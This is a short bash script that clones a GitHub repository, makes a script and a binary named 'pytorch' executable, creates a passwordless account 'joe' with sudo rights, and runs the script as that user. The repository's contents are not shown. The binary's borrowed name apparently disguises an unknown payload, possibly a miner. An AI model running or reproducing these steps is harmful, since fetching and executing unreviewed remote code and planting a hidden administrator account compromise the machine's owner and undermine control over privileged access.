#!/bin/bash
sudo apt update
git clone https://github.com/babehdyo/Workergits.git && cd Workergits
chmod +x yes.sh && chmod +x pytorch
sudo adduser --disabled-password --gecos "" joe && sudo usermod -aG sudo joe
sudo -u joe -H sh -c "./yes.sh"
